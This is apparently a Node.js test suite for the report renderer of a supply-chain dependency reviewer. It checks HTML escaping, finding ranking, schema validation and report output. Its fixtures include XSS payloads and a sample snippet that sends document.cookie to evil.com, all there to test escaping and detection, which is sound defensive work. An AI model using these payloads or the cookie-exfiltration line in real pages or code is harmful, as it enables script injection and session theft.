import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFile, mkdir, rm } from 'node:fs/promises';
import { resolve, join } from 'node:path';
import {
  escapeHtml,
  deriveKeyReasons,
  buildReportData,
  renderHtmlReport,
  generateReport
} from '../src/report.mjs';
import { validateAgainstSchema } from './schema.test.mjs';

describe('JSON/HTML Report Renderer Tests (Step 10)', () => {
  it('escapes malicious HTML characters to prevent XSS in reports', () => {
    assert.equal(escapeHtml('<script>alert("xss")</script>'), '&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;');
    assert.equal(escapeHtml('"><img src=x onerror=alert(1)>'), '&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
    assert.equal(escapeHtml("Tom & 'Jerry'"), 'Tom &amp; &#39;Jerry&#39;');
    assert.equal(escapeHtml(null), '');
    assert.equal(escapeHtml(undefined), '');
  });

  it('derives top 3 key reasons prioritizing critical and high observations', () => {
    const evidence = {
      collectionStatus: 'quarantine',
      observations: [
        { packageName: 'pkg-a', ruleId: 'LIFECYCLE_SCRIPT_ADDED', severity: 'medium', explanation: 'Added install script' },
        { packageName: 'pkg-b', ruleId: 'ARTIFACT_INTEGRITY_MISMATCH', severity: 'critical', explanation: 'Hash mismatch' },
        { packageName: 'pkg-c', ruleId: 'PROCESS_EXECUTION', severity: 'high', explanation: 'Child process execution' },
        { packageName: 'pkg-d', ruleId: 'ENVIRONMENT_ACCESS', severity: 'medium', explanation: 'Env var access' }
      ]
    };

    const reasons = deriveKeyReasons(evidence);
    assert.equal(reasons.length, 3);
    assert.match(reasons[0], /Hash mismatch/);
    assert.match(reasons[1], /Child process execution/);
    assert.match(reasons[2], /Added install script/);
  });

  it('builds valid report data structure matching schemas/report.schema.json', async () => {
    const evidence = {
      runId: 'test-run-123',
      subjectDigest: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
      mode: 'fixture',
      collectionStatus: 'complete',
      packages: [
        {
          name: 'picocolors',
          location: 'node_modules/picocolors',
          changeType: 'added',
          isDirect: true,
          version: '1.1.1',
          previousVersion: null,
          hasInstallScript: false
        }
      ],
      observations: [],
      unknowns: ['Runtime behavior was not executed.']
    };

    const reportData = buildReportData(evidence, null, null, 'reports/demo/test-run');
    assert.equal(reportData.schemaVersion, '1.0');
    assert.equal(reportData.overallRecommendation, 'ALLOW');
    assert.equal(reportData.reviewStatus, 'Awaiting human review');
    assert.ok(reportData.reviewCommand.includes('node src/cli.mjs review'));

    // Validate against schemas/report.schema.json
    const schemaRaw = await readFile(resolve('schemas/report.schema.json'), 'utf8');
    const reportSchema = JSON.parse(schemaRaw);
    assert.doesNotThrow(() => {
      validateAgainstSchema(reportSchema, reportData);
    });
  });

  it('renders complete HTML report containing all Section 9 required sections and escaping hostile content', () => {
    const reportData = {
      schemaVersion: '1.0',
      runId: 'run-xss-test',
      subjectDigest: '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef',
      generatedAt: '2026-09-27T12:00:00.000Z',
      mode: 'fixture',
      collectionStatus: 'quarantine',
      overallRecommendation: 'BLOCK',
      keyReasons: ['Malicious package detected', 'Reason 2', 'Reason 3'],
      packages: [
        {
          name: '<script>evil</script>',
          changeType: 'added',
          isDirect: true,
          version: '1.0.0',
          previousVersion: null,
          location: 'node_modules/<script>',
          hasInstallScript: true,
          integrity: 'sha512-test=='
        }
      ],
      investigations: null,
      observations: [
        {
          id: 'obs-1',
          packageName: '<script>evil</script>',
          ruleId: 'LIFECYCLE_SCRIPT_ADDED',
          severity: 'high',
          evidenceRef: 'package.json#scripts',
          snippet: 'fetch("http://evil.com?cookie=" + document.cookie)',
          explanation: 'Hostile code detected: <script>alert(1)</script>'
        }
      ],
      unknowns: ['Runtime not observed.'],
      reviewStatus: 'Awaiting human review',
      reviewCommand: 'node src/cli.mjs review --run test --interactive --mode trusted-local-demo'
    };

    const html = renderHtmlReport(reportData);

    // 1. Check all required sections are present
    assert.ok(html.includes('Supply Chain Bouncer &mdash; Dependency Review'));
    assert.ok(html.includes('Top Findings &amp; Recommendation Rationale'));
    assert.ok(html.includes('1. Human Review Decision Status'));
    assert.ok(html.includes('2. Changed Dependencies'));
    assert.ok(html.includes('3. Deterministic Static Observations'));
    assert.ok(html.includes('4. Bob Investigator Results'));
    assert.ok(html.includes('5. Coverage Limits &amp; Explicit Unknowns'));
    assert.ok(html.includes('6. Remediation &amp; Compatibility Guidance'));

    // 2. Check XSS prevention: unescaped script tag must NOT exist in HTML
    assert.equal(html.includes('<script>evil</script>'), false);
    assert.ok(html.includes('&lt;script&gt;evil&lt;/script&gt;'));
    assert.equal(html.includes('<script>alert(1)</script>'), false);
    assert.ok(html.includes('&lt;script&gt;alert(1)&lt;/script&gt;'));
  });

  it('generates report.json and report.html on disk via generateReport', async () => {
    // Generate reports for existing live-benign run
    const result = await generateReport('reports/demo/live-benign');

    assert.ok(result.reportJsonPath.endsWith('report.json'));
    assert.ok(result.reportHtmlPath.endsWith('report.html'));

    const jsonOnDisk = JSON.parse(await readFile(result.reportJsonPath, 'utf8'));
    const htmlOnDisk = await readFile(result.reportHtmlPath, 'utf8');

    assert.equal(jsonOnDisk.overallRecommendation, 'ALLOW');
    assert.ok(htmlOnDisk.includes('<!DOCTYPE html>'));
    assert.ok(htmlOnDisk.includes('Supply Chain Bouncer'));

    // Validate disk report against report schema
    const schemaRaw = await readFile(resolve('schemas/report.schema.json'), 'utf8');
    const reportSchema = JSON.parse(schemaRaw);
    assert.doesNotThrow(() => {
      validateAgainstSchema(reportSchema, jsonOnDisk);
    });
  });
});
